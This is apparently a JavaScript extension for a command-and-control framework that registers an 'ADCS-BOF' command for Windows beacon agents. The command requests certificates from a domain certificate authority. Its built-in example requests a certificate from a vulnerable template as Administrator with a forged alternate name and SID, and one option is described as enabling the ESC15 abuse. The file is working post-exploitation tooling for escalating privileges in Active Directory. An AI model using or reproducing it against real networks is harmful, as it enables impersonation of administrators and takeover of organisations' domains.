
var _cmd_certi_req = ax.create_command("request", "Request an enrollment certificate", "certi req --ca cert.example.org\\example-CERT-CA --template vulnTemplate --subject CN=Administrator,CN=Users,DC=example,DC=org --altname CN=second_adm,CN=Users,DC=example,DC=org --alturl tag:microsoft.com,2022-09-14:sid:S-1-5-21-3006160104-3291460162-27467737-1123");
_cmd_certi_req.addArgFlagString( "--ca",      "CA",       true, "The certificate authority to use");
_cmd_certi_req.addArgFlagString("--template", "template",       "The certificate type to request (else default for User/Machine)", "");
_cmd_certi_req.addArgFlagString("--subject",  "subject",        "The subject's distinguished name (else default for user/machine)", "");
_cmd_certi_req.addArgFlagString("--altname",  "altname",        "The alternate subject's distinguished name", "");
_cmd_certi_req.addArgFlagString("--alturl",   "alturl",         "SAN URL entry, can be used to specify the alternate subject's SID", "");
_cmd_certi_req.addArgBool("--install", "Install the certificate in current context?");
_cmd_certi_req.addArgBool("--machine", "Request a certificate for a machine instead of a user?");
_cmd_certi_req.addArgBool("--policy",  "Adds App policy to allow client auth and Acting as a certificate agent (for ESC15)");
_cmd_certi_req.addArgBool("--dns",     "Subject Altname given as a DNS name (else: Subject alt name given as UPN)");
_cmd_certi_req.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {

    let ca       = "";
    let template = "";
    let subject  = "";
    let altname  = "";
    let alturl   = "";
    let install = 0;
    let machine = 0;
    let policy  = 0;
    let dns     = 0;

    if("CA" in parsed_json) {
        ca = parsed_json["CA"];
    } else {
        throw new Error("Need to provide the Certificate Authority at a minimum");
    }

    if("template" in parsed_json) { template = parsed_json["template"]; }
    if("subject" in parsed_json) { subject = parsed_json["subject"]; }
    if("altname" in parsed_json) { altname = parsed_json["altname"]; }
    if("alturl" in parsed_json) { alturl = parsed_json["alturl"]; }
    if(parsed_json["--install"]) { install = 1; }
    if(parsed_json["--machine"]) { machine = 1; }
    if(parsed_json["--policy"]) { policy = 1; }
    if(parsed_json["--dns"]) { dns = 1; }

    let bof_params = ax.bof_pack("wstr,wstr,wstr,wstr,wstr,short,short,short,short", [ca, template, subject, altname, alturl, install, machine, policy, dns ]);
    let bof_path = ax.script_dir() + "_bin/ADCS/certi_req." + ax.arch(id) + ".o";
    let message = "Task: Request certificate";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
});


var cmd_certi = ax.create_command("certi", "ADCS BOF");
cmd_certi.addSubCommands([ _cmd_certi_req ]);

var group_adcs = ax.create_commands_group("ADCS-BOF", [cmd_certi]);
ax.register_commands_group(group_adcs, ["beacon", "gopher"], ["windows"], []);